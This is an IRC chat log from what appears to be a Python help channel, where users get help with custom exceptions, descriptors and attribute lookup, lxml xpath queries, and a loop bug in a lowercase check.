[10:31:12] <senaps> bjs, the idea is we use this class in a code, that is the core of another code that will be using as frameworks to build an application. (3 layers! deep classes) now, we can in web application call a function, receive an exception like i showed you, then we can decide what to show on the webpage. so do we want to show file wasn't able to be opened
[10:31:13] <senaps> or file didn't exist or just show an error or something like that.
[10:31:18] *** Joins: Miroboru (~myrvoll@133.58.244.158)
[10:32:11] <senaps> it's to allow us create more dynamic exception objects that we can show error code in syslog, decide if we want to show it to user or not, and decide on faileover process.
[10:32:57] <najtsirk> cdunklau: Do you have any example of how to write custom descriptor?
[10:33:22] <cdunklau> najtsirk: https://docs.python.org/3/reference/datamodel.html#descriptors
[10:33:46] *** Joins: alexandre9099 (~alexandre@unaffiliated/alexandre9099)
[10:33:50] *** Quits: fr0ddy (~fr0ddy@49.248.66.98) (Ping timeout: 276 seconds)
[10:33:52] <senaps> guess i give the user the ability to change ip of the system, he enters the ip, app tries the ip, if it was able to set it, the good but if not, it may try to set it some other way. or get back to user with a detailed error, or just throw them a number that user can call us with and we can figure out what the problem is. bjs.
[10:34:09] <cdunklau> najtsirk: you just write a thing that has a __get__ method that does the warning, and returns the value
[10:34:23] *** Quits: fikka (~fikka@31.223.233.9) (Ping timeout: 276 seconds)
[10:34:32] <cdunklau> najtsirk: and in the class, you use it like CONSTANT_1 = YourDescriptorClass()
[10:34:35] <najtsirk> cdunklau: Thanks!
[10:34:57] *** Joins: brainproxy (~michael@pdpc/supporter/gold/brainproxy)
[10:35:12] *** Joins: cdown_ (~cdown@199.201.66.0)
[10:35:33] <cdunklau> najtsirk: and you could presumably make your descriptor class accept an argument with the string to use in the warning
[10:35:47] *** Joins: adamholmberg (~adamholmb@69.80.114.120)
[10:35:57] <cdunklau> najtsirk: but i'd probably deprecate this entire class as it's awful :)
[10:36:19] <bjs> senaps: I mean, doing this properly (to achieve what you said) would mean wrapping each built-in error with your own error class, catching each one and re-raising with the information again
[10:36:31] *** Quits: re1 (~rsrx@cable-94-189-224-42.dynamic.sbb.rs) (Ping timeout: 256 seconds)
[10:36:33] <bjs> senaps: this is a *huge* amount of machinery and effort for what appears to be, no reason
[10:36:53] *** Joins: greg_f (~greg@altlinux/developer/greg)
[10:37:03] *** Quits: evil_gordita (robert@ip70-188-41-127.rn.hr.cox.net) ()
[10:37:31] <bjs> senaps: because, open() *already* raises a FileNotFoundError if it didn't find the file
[10:37:42] *** Quits: cdown (~cdown@199.201.66.44) (Ping timeout: 245 seconds)
[10:37:46] *** cdown_ is now known as cdown
[10:37:50] <bjs> why would you want to catch it, and re-raise MyFileNotFoundCustomError ?
[10:38:09] *** Quits: zzzoid (~zzzoid@178.197.239.11) (Quit: Leaving)
[10:38:11] *** Joins: lumm_ (~lumm@160.204.136.77.rev.sfr.net)
[10:38:54] *** Quits: wleslie (~verte@python/site-packages/verte) (Quit: ~~~ Crash in JIT!)
[10:38:57] <najtsirk> cdunklau: I want to deprecate entire class. But event if i get constants = Constants or a_constant=Constants.CONSTANT_1 I got no warnign
[10:39:13] <bjs> najtsirk: you can't do anything about `constants = Constants
[10:39:19] <cdunklau> najtsirk: you're probably not telling python you want warnings
[10:39:20] <bjs> najtsirk: but you can make the second warn
[10:39:31] <cdunklau> bjs: in 3.7 you could! :)
[10:39:37] *** Joins: rjdp9736 (~rjdp9736@49.205.216.204)
[10:39:43] <bjs> cdunklau: I guess
[10:39:47] <senaps> bjs, i don't want to and am here to find better reasons why not do it when employer says im paying you to do it! :)  they want this style so new developers are able to code with an standard. and so customers are not presented with a filenotfounderror. but a solution or easy way of getting help from our support by just telling us error X happened, h
[10:39:47] <senaps> w i fix it?
[10:39:49] *** Joins: AliGeyik (~Thunderbi@82.222.185.98)
[10:39:51] <cdunklau> oh well at least  thing = constantsmodule.Constants
[10:39:57] *** Joins: uttam (~uttam@vpn.bose.res.in)
[10:40:13] <najtsirk> cdunklau: if I put warnigns in __init__ I got them. But We dont use class instantiation...jsut accessing the class atributes within it.
[10:40:29] *** Joins: b3h3m0th (uid26288@gateway/web/irccloud.com/x-vokygfswfibonlrm)
[10:40:30] <bjs> senaps: the usual way is two step: first, catch the FileNotFoundError where you call open() and do something useful with it
[10:40:40] *** Joins: lankanmon (~LKNnet@CPE64777d632383-CM64777d632380.cpe.net.cable.rogers.com)
[10:40:47] *** Quits: adamholmberg (~adamholmb@69.80.114.120) (Ping timeout: 265 seconds)
[10:40:50] <cdunklau> najtsirk: https://docs.python.org/3/library/warnings.html#default-warning-filter
[10:41:05] *** Quits: lumm (~lumm@44.204.136.77.rev.sfr.net) (Ping timeout: 248 seconds)
[10:41:05] *** lumm_ is now known as lumm
[10:41:15] <cdunklau> najtsirk: show us the code
[10:41:16] <bjs> senaps: then second: catch all exceptions at the top-level and display a generic "There was a problem..." to the user and log the real exception for your developers to review later
[10:42:46] *** Joins: r4ulrm (~administr@mail.klonal.com.ar)
[10:42:54] *** Quits: MrAureliusR (~MrAureliu@2607:fea8:8460:63b::b) (Remote host closed the connection)
[10:43:28] *** Quits: uttam (~uttam@vpn.bose.res.in) (Client Quit)
[10:43:48] *** Joins: quxgyver (uid302084@gateway/web/irccloud.com/x-qygvuhuyveejljxo)
[10:43:57] *** Quits: amz31 (~amz3@fsfe/amz3) (Ping timeout: 245 seconds)
[10:44:08] *** Quits: psi29a (~psi29a@129.253.244.4) (Ping timeout: 276 seconds)
[10:44:35] <bjs> najtsirk: for example: https://paste.pound-python.org/show/vhTKQoxF2ElLGhQkhGsE/
[10:44:42] *** Joins: uttam (~uttam@vpn.bose.res.in)
[10:45:29] *** Joins: MrAureliusR (~MrAureliu@2607:fea8:8460:63b::b)
[10:45:56] *** Quits: uttam (~uttam@vpn.bose.res.in) (Client Quit)
[10:47:20] *** Quits: dre_ (~dre_@121-74-95-135.telstraclear.net) (Remote host closed the connection)
[10:47:29] *** Joins: Syzygy (~Syzygy@2001:850:40bc:8000:94c8:3232:f35e:1ba8)
[10:47:34] *** Joins: fr0ddy (~fr0ddy@49.248.66.98)
[10:48:16] *** Joins: geekodour08 (~Mutter@42.108.34.60)
[10:48:39] *** Quits: geekodour08 (~Mutter@42.108.34.60) (Client Quit)
[10:48:52] *** Joins: Richard_Cavell (~Richard_C@unaffiliated/richard-cavell/x-0571696)
[10:49:34] *** Joins: traira (~Adium@187-78-31-157.user.veloxzone.com.br)
[10:49:51] <najtsirk> bjs: Thanks. That is the only option, right? Cannot just deprecate the whole class, right?
[10:50:37] <khalella> im using lxml.html to parse some HTML like this... lxml.html.fromstring(string) i can use el = html.get_element_by_id(id) to get <div id="foo">... is there an equvalent for tags that don't have an id, like all <img> tags ?
[10:51:18] <khalella> i would like to .drop_tag() on <img and <a tags
[10:51:42] <Yhg1s> khalella: html.xpath('//html')
[10:51:51] <Yhg1s> eh, '//img' of course.
[10:52:27] *** Quits: davr0s (~textual@host86-138-235-28.range86-138.btcentralplus.com) (Quit: My MacBook Pro has gone to sleep. ZZZzzz…)
[10:53:44] *** Quits: graphene (~graphene@46.101.134.251) (Remote host closed the connection)
[10:54:24] *** Joins: graphene (~graphene@46.101.134.251)
[10:54:26] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[10:54:34] *** Joins: s14ve (~s14ve@80.188.193.126)
[10:55:00] *** Quits: graphene (~graphene@46.101.134.251) (Read error: Connection reset by peer)
[10:55:02] <khalella> hmmmm
[10:55:05] <khalella> thanks Yhg1s
[10:55:51] *** Quits: antgel (~topdog@141.226.120.30) (Ping timeout: 240 seconds)
[10:55:52] *** Joins: graphene (~graphene@46.101.134.251)
[10:56:26] *** Joins: wleslie (~verte@python/site-packages/verte)
[10:56:41] *** Quits: plutoniix (~q@175.176.222.7) (Quit: Leaving)
[10:56:54] *** Quits: tsaka__ (~torstein@84-52-234.108.3p.ntebredband.no) (Quit: Konversation terminated!)
[10:57:11] *** Joins: tsaka__ (~torstein@84-52-234.108.3p.ntebredband.no)
[10:57:41] *** Joins: WhileTrue (~WhileTrue@unaffiliated/whiletrue)
[10:57:45] *** Joins: antgel (~topdog@213.57.83.154)
[10:57:58] *** Joins: Kundry_Wag (~Kundry_Wa@177.18.249.170)
[10:58:42] *** Quits: royal_screwup21 (8600d6aa@gateway/web/cgi-irc/kiwiirc.com/ip.134.0.214.170) (Quit: http://www.kiwiirc.com/ - A hand crafted IRC client)
[10:58:56] *** Joins: alexmitchell (~alexmitch@118.211.33.127)
[10:59:23] *** Joins: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de)
[10:59:37] *** Joins: amz31 (~amz3@fsfe/amz3)
[11:00:01] *** Quits: graphene (~graphene@46.101.134.251) (Remote host closed the connection)
[11:00:17] <WhileTrue> hello, this is not a correct code but cant find the error; https://paste.debian.net/1031663/ it gives "True" for any word
[11:00:46] <Yhg1s> WhileTrue: well, you only return the result of the very last character in the string.
[11:00:49] *** Joins: graphene (~graphene@46.101.134.251)
[11:00:50] <Yhg1s> WhileTrue: so it would return False for 'FOO'
[11:01:12] *** Quits: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au) (Remote host closed the connection)
[11:02:23] <WhileTrue> Yhg1s, where in the code is the very last character referred to?
[11:02:41] <han-solo> its in a loop
[11:02:44] <bjs> WhileTrue: have you tried tracing your code through on paper with the 'Beam' example?
[11:02:54] <Yhg1s> WhileTrue: In the loop, you go over each character, and assign a new value to 'flag' each time. Discarding the old value of 'flag', from any previous iteration.
[11:03:14] <Yhg1s> WhileTrue: you then return the value of 'flag', which is the last value that was assigned to it. which is from the last iteration. which is from the last character in the string.
[11:04:13] <WhileTrue> Yhg1s, sure, but then when it comes to the first letter which is capital it should end by returning "False", no?
[11:04:27] <WhileTrue> bjs, no
[11:04:35] <Yhg1s> WhileTrue: no. Why would it end? You don't return anything until after the loop is done, and you don't end the loop prematurely.
[11:04:36] <henbruas> No, because that is overwritten on the next iteration
[11:04:38] *** Joins: contingo (~textual@cpc82355-lewi18-2-0-cust128.2-4.cable.virginm.net)
[11:04:42] <bjs> WhileTrue: then I suggest trying it, step through the execution
[11:04:48] *** Joins: roadie (~user@2a02:8108:f40:17f1:953:d4f3:7b58:ff8d)
[11:04:52] *** Quits: dmoliveira (~danilo@danilo-desktop.zdv.uni-mainz.de) (Quit: WeeChat 1.4)
[11:05:05] *** Quits: brainproxy (~michael@pdpc/supporter/gold/brainproxy) (Ping timeout: 248 seconds)
[11:05:16] *** Quits: defkult (~defkult@71-14-143-168.dhcp.ftwo.tx.charter.com) (Quit: quit)
[11:05:46] <WhileTrue> but henbruas, "islower" requires all letters to be lowercase; if one breaks the rule, it is enough for "False"
[11:05:58] *** Quits: carl- (~carl-@h-213-136-53-77.NA.cust.bahnhof.se) (Read error: Connection reset by peer)
[11:06:02] <henbruas> But you always return at the end regardless
[11:06:09] <bjs> WhileTrue: but you only ever run islower() on c
[11:06:12] <Yhg1s> WhileTrue: that is the case, yes, but it only operates on thes tring you call it on.
[11:06:16] *** Joins: carl- (~carl-@h-213-136-53-77.NA.cust.bahnhof.se)
[11:06:21] <Yhg1s> WhileTrue: you call it on each character. You don't call it on the whole string at once.
[11:07:16] *** Joins: pepijndevos (524b7326@gateway/web/freenode/ip.82.75.115.38)
[11:07:17] <WhileTrue> ah, this doesnt do the search on the word, but on each letter individually instead?
[11:07:30] <Yhg1s> WhileTrue: that's what your code does.
[11:07:43] <Yhg1s> WhileTrue: because you iterate over the string. That gives you each character in turn.
[11:08:28] <han-solo> WhileTrue: i thought you already got this last Friday :/
[11:08:37] <pepijndevos> When using CFFI, what is the proper way to wrap a C struct in a Python class in terms of making sure it gets freed together with the wrapper class? IIRC __del__ is not guaranteed to be called, so a bad idea.
[11:08:50] *** Joins: Avinash (~Avinash@unaffiliated/avinash)
[11:08:52] *** Joins: carl-- (~carl-@h-213-136-53-77.NA.cust.bahnhof.se)
[11:09:10] *** Joins: spufi (~spufi@dd47b0e02.static.telenet.be)
[11:09:23] <WhileTrue> but this one https://paste.debian.net/1031665/ is also operating each letter, then, however it returns correct results
[11:09:30] <WhileTrue> on each letter*
[11:09:35] *** Quits: AnySomebody (~AnySomebo@192.129.2.104) (Ping timeout: 276 seconds)
[11:10:00] <Yhg1s> WhileTrue: no, that one only operates on the *first* letter. Because it always returns a value in the first iteration of the loop. It never gets to the second character in the word.
[11:10:08] <bjs> WhileTrue: try work out what this code will print by working it through on paper: https://paste.pound-python.org/show/GX4cctJc5d9as4LGxXKJ/
[11:10:18] *** Quits: }ls{ (~kalle@unaffiliated/ls/x-8089558) (Ping timeout: 260 seconds)
[11:10:41] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Quit: The Lounge - https://thelounge.github.io)
[11:10:44] *** Joins: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com)
[11:10:49] <bjs> WhileTrue: how many times does the 2nd print happen and what are each of the values for 'c' ? for example
[11:11:16] *** Quits: senaps (25627232@gateway/web/cgi-irc/kiwiirc.com/ip.37.98.114.50) (Remote host closed the connection)
[11:11:24] *** Quits: carl- (~carl-@h-213-136-53-77.NA.cust.bahnhof.se) (Ping timeout: 256 seconds)
[11:11:34] *** Joins: rudrab (~rudrab@14.139.59.140)
[11:11:35] *** Quits: c-fire (~c-fire@unaffiliated/c-fire) (Ping timeout: 240 seconds)
[11:11:53] *** Joins: amirpro (~amirpro@41.234.193.158)
[11:12:28] *** Joins: _feuillemorte (irc@nat/redhat/x-lpcoggghkefrqmby)
[11:14:05] *** Quits: feuillemorte (irc@nat/redhat/x-hpxcvvwzjejwmzdf) (Ping timeout: 240 seconds)
[11:14:24] *** Joins: gvalkov (~gv@unaffiliated/gvalkov)
[11:14:30] *** Quits: rudrab (~rudrab@14.139.59.140) (Client Quit)
[11:14:36] *** Quits: wleslie (~verte@python/site-packages/verte) (Quit: ~~~ Crash in JIT!)
[11:14:57] *** Quits: rpkilby (~rpkilby@cpe-76-182-45-76.nc.res.rr.com) (Ping timeout: 240 seconds)
[11:15:01] *** Quits: Kundry_Wag (~Kundry_Wa@177.18.249.170) (Remote host closed the connection)
[11:15:06] *** Joins: rudrab (~rudrab@14.139.59.140)
[11:15:16] *** Joins: Kundry_Wag (~Kundry_Wa@177.18.249.170)
[11:15:29] *** Joins: Spacey (~Thunderbi@x5ce32845.dyn.telefonica.de)
[11:15:33] *** Joins: uttam (~uttam@vpn.bose.res.in)
[11:15:38] *** Joins: }ls{ (~kalle@unaffiliated/ls/x-8089558)
[11:15:58] *** Joins: akar (~user@182.253.1.146)
[11:16:17] *** Quits: Kundry_Wag (~Kundry_Wa@177.18.249.170) (Remote host closed the connection)
[11:17:08] *** Joins: feuillemorte (irc@nat/redhat/x-lticnzwccvgtljsm)
[11:17:11] *** Quits: pankaj (~pankaj@103.226.89.207) (Quit: leaving)
[11:18:17] *** Quits: _feuillemorte (irc@nat/redhat/x-lpcoggghkefrqmby) (Ping timeout: 255 seconds)
[11:18:26] *** Quits: amz31 (~amz3@fsfe/amz3) (Ping timeout: 268 seconds)
[11:19:50] *** Joins: platvoeten (~platvoete@178-85-122-247.dynamic.upc.nl)
[11:19:52] *** Quits: amirpro (~amirpro@41.234.193.158) (Quit: amirpro)
[11:20:21] *** Quits: rudrab (~rudrab@14.139.59.140) (Ping timeout: 256 seconds)
[11:21:14] *** Quits: jjulian (~jjulian@i5DB5037D.pool.tripleplugandplay.com) (Remote host closed the connection)
[11:21:35] *** Joins: lysanderx (~lysanderx@ip24-254-57-19.br.br.cox.net)
[11:21:43] *** Joins: jjulian (~jjulian@i5DB5037D.pool.tripleplugandplay.com)
[11:21:55] *** Quits: volition (volition@gateway/vpn/privateinternetaccess/volition) (Quit: Leaving)
[11:22:08] *** Quits: akar (~user@182.253.1.146) (Ping timeout: 268 seconds)
[11:22:09] *** Quits: lumm (~lumm@160.204.136.77.rev.sfr.net) (Ping timeout: 248 seconds)
[11:23:03] *** Joins: AnySomebody (~AnySomebo@192.129.2.104)
[11:23:06] *** Quits: tsaka__ (~torstein@84-52-234.108.3p.ntebredband.no) (Quit: Konversation terminated!)
[11:23:22] *** Quits: patdaburu (~patdaburu@24-177-166-2.dhcp.mrqt.mi.charter.com) (Ping timeout: 260 seconds)
[11:23:50] *** Joins: qrvpzvb (~otto@ppp005054155085.access.hol.gr)
[11:25:22] *** Quits: YuGiOhJCJ (~YuGiOhJCJ@gateway/tor-sasl/yugiohjcj) (Quit: YuGiOhJCJ)
[11:25:31] *** Joins: rendar (~rendar@unaffiliated/rendar)
[11:26:42] *** Joins: negaduck (~negaduck@ip-95-221-156-55.bb.netbynet.ru)
[11:26:47] *** Joins: Haudegen (~quassel@212-186-77-29.static.upcbusiness.at)
[11:27:04] *** Joins: rsrx (~rsrx@cable-94-189-224-42.dynamic.sbb.rs)
[11:27:53] *** Quits: BTRE (~BTRE@unaffiliated/btre) (Remote host closed the connection)
[11:28:49] *** Quits: LambaInsaan (~lambainsa@157.49.226.37) (Remote host closed the connection)
[11:29:01] *** Quits: wgas (~wgas@unaffiliated/wgas) (Quit: Leaving)
[11:29:01] *** Quits: drymer (~drymer@unaffiliated/drymer) (Read error: Connection reset by peer)
[11:29:02] * WhileTrue is busy getting it straight
[11:29:07] *** Joins: BTRE (~BTRE@unaffiliated/btre)
[11:29:13] *** Joins: Ruhan (uid76353@gateway/web/irccloud.com/x-abpmgykbxhudywnx)
[11:30:09] *** Joins: amz31 (~amz3@fsfe/amz3)
[11:30:14] *** Joins: giaco (~giaco@37.162.24.130)
[11:30:16] *** Joins: fikka (~fikka@31.223.233.9)
[11:30:20] *** Joins: drymer (~drymer@unaffiliated/drymer)
[11:30:37] *** Quits: Fulgen (~Fulgen@078132032127.public.t-mobile.at) (Quit: Leaving)
[11:31:20] *** Joins: psi29a (~psi29a@129.253.244.4)
[11:31:30] <han-solo> What is the order of calls when accessing an attribute, __get__, __getattr__, __getattribute__ ? I presume, some precedence is there
[11:31:35] <WhileTrue> han-solo, I presume you mean our conversation on "return" and "print"
[11:31:38] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[11:31:46] <han-solo> WhileTrue: yes, you had the same examples
[11:31:47] *** Joins: geert2705 (~geert2705@ip4da85734.direct-adsl.nl)
[11:32:01] <han-solo> __getattr__ has the least precedence among the three ?
[11:32:15] *** Joins: b (coffee@gateway/vpn/privateinternetaccess/b)
[11:32:18] <Yhg1s> han-solo: it's not a linear order. They are different attributes for different things. __getattribute__ is called to get an attribute. __getattr__ is called when the attribute does not exist. __get__ is called on a descriptor when it's fetched from a class or an instance of a class.
[11:33:22] *** Joins: brainproxy (~michael@pdpc/supporter/gold/brainproxy)
[11:33:27] <han-solo> So, __getattribute__ gets called always, right ?
[11:33:30] *** Quits: naan_ (~naan@unaffiliated/naan) (Quit: Leaving)
[11:33:39] <Yhg1s> han-solo: let's say yes.
[11:33:52] <han-solo> I'm confused between the __get__ and __getattribute__,
[11:33:58] <cdunklau> han-solo: they're entirely different
[11:34:03] <Yhg1s> han-solo: as I said, __get__ is a different thing altogether.
[11:34:11] <cdunklau> han-solo: __get__ is a descriptor protocol thing
[11:34:13] <han-solo> Yhg1s: cdunklau : Okay
[11:34:25] *** Quits: fikka (~fikka@31.223.233.9) (Ping timeout: 248 seconds)
[11:34:30] *** Joins: gareppa (~gareppa@unaffiliated/gareppa)
[11:34:34] <han-solo> Yeah, what if i put __get__ and __getattribute__ on the same class, let me check
[11:34:37] <cdunklau> han-solo: it gets invoked "after" the __getatribute__ dance
[11:34:43] <han-solo> Okay
[11:34:51] <han-solo> That makes sense
[11:34:57] <Yhg1s> han-solo: it's like putting __add__ and __getitem__ on the same class. They are different things, for different purposes, called in different situations.
[11:34:58] <cdunklau> (not exactly, but that's conceptually what happens)
[11:35:02] <Yhg1s> cdunklau: but not on the same class.
[11:35:06] <cdunklau> right
[11:35:10] <cdunklau> key point, that
[11:35:11] *** Joins: mjolnird (~mjolnird@2601:2c7:8200:5a1::3b40)
[11:35:29] *** Quits: alexandre9099 (~alexandre@unaffiliated/alexandre9099) (Ping timeout: 248 seconds)
[11:35:37] <cdunklau> han-solo: say you do o = SomeClass(), then do o.someattr
[11:36:06] *** Joins: JBzh (~JBzh@194.250.104.123)
[11:36:44] <han-solo> Okay
[11:37:08] <JBzh> Good afternoon
[11:37:11] *** Quits: sayan (~sayan@fedora/sayan) (Quit: WeeChat 1.9.1)
[11:37:13] <cdunklau> han-solo: __getattribute__ gets called to do the 'someattr' lookup. if it doesn't exist in the "normal places", __getattribute__ will invoke __getattr__ as a fallback
[11:37:13] <han-solo> Okay, so i don't think it's a great idea to mess with __getattribute__ :)
[11:37:18] <cdunklau> nope, not at all
[11:37:24] *** Joins: sayan (~sayan@fedora/sayan)
[11:37:25] *** Quits: nifo (~nothing@192.157.192.154) (Remote host closed the connection)
[11:37:29] *** Joins: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au)
[11:37:51] <cdunklau> han-solo: now if __getattribute__ does find it in the normal places, and the thing it finds implements __get__, the descriptor dance happens
[11:37:57] *** Quits: gareppa (~gareppa@unaffiliated/gareppa) (Client Quit)
[11:38:10] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Ping timeout: 264 seconds)
[11:38:16] <Yhg1s> (except if __getattribute__ finds it in __dict__ or slots.)
[11:38:51] *** Quits: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de) (Ping timeout: 240 seconds)
[11:38:58] <han-solo> Okay, cool. Thanks guys
[11:39:39] <cdunklau> the thing i'm not sure about is if __getattribute__ is the thing that does the descriptor dance itself, or if there's some other mechanism
[11:39:58] <Yhg1s> cdunklau: it isn't specified, and it isn't determinable.
[11:40:03] <cdunklau> hooray!
[11:40:11] <han-solo> Yhg1s: cdunklau : Have any better descriptor blog or write up, other than docs. As i now see, the descriptor docs is not that ... well, for starters
[11:40:21] *** Joins: stardust85 (~ms580j@144.160.226.95)
[11:41:06] *** Joins: Kundry_Wag (~Kundry_Wa@177.18.249.170)
[11:41:07] <cdunklau> han-solo: descriptors are reasonable straightforward, actually.
[11:41:25] <nedbat> cdunklau: too bad the "descriptor howto" is so opaque
[11:41:29] <cdunklau> han-solo: function objects are descriptors, in fact. that's what makes methods work
[11:41:47] <han-solo> cdunklau: Yeah, i think i understand the basic reasoning, and i sae dabeaz use of it for type checking stuff
[11:41:49] *** Joins: tiwula (~lane@184.170.76.198)
[11:42:00] *** Joins: callMe_something (~callMe_Du@117.204.127.101)
[11:42:15] *** Quits: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au) (Ping timeout: 256 seconds)
[11:42:25] *** Quits: lysanderx (~lysanderx@ip24-254-57-19.br.br.cox.net) (Ping timeout: 248 seconds)
[11:42:36] <cdunklau> han-solo: somefunction.__get__ returns itself if accessed via the class
[11:42:37] <bjs> nedbat: you've tried :)
[11:42:52] *** Quits: Kundry_Wag (~Kundry_Wa@177.18.249.170) (Remote host closed the connection)
[11:42:58] *** Joins: amirpro (~amirpro@154.238.18.159)
[11:43:18] <cdunklau> han-solo: but if accessed via an instance, somefunction.__get__ will return a bound method object. this is the thing that provides the instance as the first argument
[11:43:36] <cdunklau> that's why we define normal methods as `def foo(self, ...):`
[11:43:44] *** Joins: defkult (~defkult@71-14-143-168.dhcp.ftwo.tx.charter.com)
[11:43:50] <cdunklau> but we don't call them like obj.foo(obj, ...)
[11:43:57] *** Quits: nolfie (~nolfie@83.145.38.204) (Ping timeout: 240 seconds)
[11:44:18] *** Quits: whaley (uid13429@gateway/web/irccloud.com/x-mbwzoocizbmcboxx) (Quit: Connection closed for inactivity)
[11:44:24] <han-solo> cdunklau: Yep
[11:44:26] *** Joins: LambaInsaan (~lambainsa@106.51.36.9)
[11:44:59] <cdunklau> han-solo: instead, we do obj.foo(), because foo's __get__ method returns a bound method that does foo(obj, ...) partial application
[11:45:27] <cdunklau> han-solo: because obj.foo doesn't give you the foo function itself, it gives you that bound method object
[11:46:01] *** Joins: jmercouris (~jmercouri@x4db3dca6.dyn.telefonica.de)
[11:46:02] <cdunklau> well, that last 'because' should be 'therefore'
[11:46:02] *** Quits: mjolnird (~mjolnird@2601:2c7:8200:5a1::3b40) (Read error: Connection reset by peer)
[11:46:09] <jmercouris> anyone to collect terminal input without the user having to press RET?
[11:46:18] <jmercouris> e.g. can I just listen for the first char entered and accept it?
[11:46:29] *** Joins: mjolnird (~mjolnird@2601:2c7:8200:5a1::3b40)
[11:46:31] *** Quits: mavrix (~mavrix@unaffiliated/mavrix) (Ping timeout: 265 seconds)
[11:46:33] *** Joins: callMe_Dude (~callMe_Du@117.201.141.223)
[11:46:37] <liste> jmercouris: yes, but you'd need to put your terminal to raw/unbuffered mode for that
[11:46:50] <rigid> jmercouris: you could use a tui framework. if that's too much, iirc click can do that in a clean way
[11:47:00] <jmercouris> or curses of course :\
[11:47:12] <cdunklau> han-solo: in this situation, obj.foo  basically results in  type(obj).__dict__['foo'].__get__(obj, type(obj))
[11:47:19] <jmercouris> rigid: I'll look a little more closely at click, thanks
[11:47:20] *** Joins: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8)
[11:47:42] *** Quits: callMe_something (~callMe_Du@117.204.127.101) (Ping timeout: 245 seconds)
[11:47:49] <han-solo> cdunklau: Uh, phew :)
[11:47:51] *** Quits: kurkale61 (~kurkale6k@84.45.99.125) (Ping timeout: 240 seconds)
[11:48:04] <cdunklau> han-solo: whereas type(obj).foo  (class attribute access)  would do type(obj).__dict__['foo'].__get__(None, type(obj))
[11:48:28] <cdunklau> han-solo: and function objects just return themselves through __get__ when the first arg is None
[11:48:29] <rigid> jmercouris: i didn't manage to look into http://npyscreen.readthedocs.io yet, but it looks interesting if you need a bit more than click offers
[11:48:35] <han-solo> I feel like, this is a lot to take in at the moment :)
[11:48:40] <cdunklau> han-solo: :)
[11:48:44] <cdunklau> don't worry, it kinda is
[11:48:56] *** Joins: libo (~libo@173.38.117.91)
[11:49:16] *** Quits: antgel (~topdog@213.57.83.154) (Ping timeout: 268 seconds)
[11:49:18] <han-solo> :)
[11:49:35] <han-solo> Well, i think i'm just reading about descriptors for no reason at all
[11:49:51] <cdunklau> han-solo: quiz time!
[11:50:02] <han-solo> Aha
[11:50:03] *** Joins: sdoherty (sdoherty@nat/redhat/x-kydiyvltmqqipodt)
[11:50:05] <cdunklau> han-solo: what do classmethod objects do?
[11:50:05] *** Joins: basen_ (~basen_@62.178.248.26)
[11:50:11] *** Quits: LambaInsaan (~lambainsa@106.51.36.9) (Ping timeout: 256 seconds)
[11:50:31] <han-solo> I'm not sure i understand
[11:50:33] <bjs> cdunklau: they do magic
[11:50:36] <bjs> next question!
[11:50:39] <cdunklau> nah, just more descriptors
[11:50:47] *** Joins: mescalinum (~me@unaffiliated/mescalinum)
[11:51:34] <cdunklau> han-solo: so you know that a classmethod lets do SomeClass.cmeth(), and then the function you gave for the classmethod gets SomeClass as an argument
[11:52:26] *** Joins: fikka (~fikka@31.223.233.9)
[11:52:39] *** Joins: mavrix (~mavrix@unaffiliated/mavrix)
[11:52:59] <cdunklau> han-solo: is that clear or new to you too?
[11:52:59] *** Joins: ytrezq (~0x0EDFADE@lcs07-lyo-176-188-198-28.sfr.lns.abo.bbox.fr)
[11:53:24] *** Joins: jepe (~jepe@205-201-98-248.plptcmtk01.res.dyn.suddenlink.net)
[11:53:49] <han-solo> cdunklau: Yeah
[11:54:00] <han-solo> So descriptors is behind that, you are saying
[11:54:04] <cdunklau> right
[11:54:20] *** Joins: Sxuza (~textual@41.13.176.25)
[11:54:45] <han-solo> yeah, from the type(obj)... thing you did, i think that how it differentiates between a call using the Class, and a call using the instance of the class, i guess
[11:54:49] *** Joins: longbow (~longbow@vwifi-employee-579.lnu.se)
[11:54:50] <cdunklau> han-solo: the key bit is that __get__ gets called with different args depending on whether it was a result of class attribute or instance attriburte access
[11:55:02] *** Joins: minimal_life (~cfurlin-x@2601:603:1500:1e9a::8436)
[11:55:07] *** Quits: qrvpzvb (~otto@ppp005054155085.access.hol.gr) (Quit: WeeChat 2.1)
[11:55:08] <han-solo> Okay
[11:55:13] <cdunklau> han-solo: right. type(obj) there just means "the type of the object"
[11:55:17] <cdunklau> AKA it's class
[11:55:24] <han-solo> Yeah
[11:56:25] <han-solo> Cool, thanks cdunklau. Good stuff :)
[11:56:30] *** Quits: amz31 (~amz3@fsfe/amz3) (Ping timeout: 260 seconds)
[11:56:43] <cdunklau> i aim to please
[11:56:50] <cdunklau> and hopefully not confuse as much as please
[11:56:50] <han-solo> :)
[11:57:09] <han-solo> Well, i would think it is confusing for some atleast
[11:57:14] *** Joins: Naresh (uid2823@gateway/web/irccloud.com/x-fdjsqzrenpiqpveb)
[11:57:14] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[11:57:20] <cdunklau> han-solo: staticmethod and property objects are also descriptors
[11:57:22] <han-solo> because that how descriptors are :)
[11:57:52] <han-solo> Yes, i understand properties are implemented using descriptors to some extend
[11:58:05] <psychuil> If i'm creating files inside a with open, how can i pass them over to an email sending method later in the code?
[11:58:12] <cdunklau> han-solo: property objects are the tricky one, since they also involve __set__ and __delete__
[11:58:13] *** Joins: zh2683 (~user@125.119.209.170)
[11:58:18] *** Joins: callMe_something (~callMe_Du@103.208.112.176)
[11:58:43] <cdunklau> han-solo: whereas function, classmethod, and staticmethod objects only involve __get__
[11:58:49] *** Joins: deltam (~deltam@unaffiliated/deltam)
[11:58:57] <han-solo> Yeah
[11:59:12] <psychuil> getting IOError: [Errno 13] Permission denied
[11:59:26] *** Joins: seajay (~seajay@2602:306:3765:3340:48c:b54c:e491:cca)
[11:59:30] <han-solo> psychuil: paste the code, and full traceback
[12:00:03] <psychuil> I'm not sure i can share traceback since it's inside a company framework
[12:00:09] *** Joins: root3d (~root3d@unaffiliated/root3d)
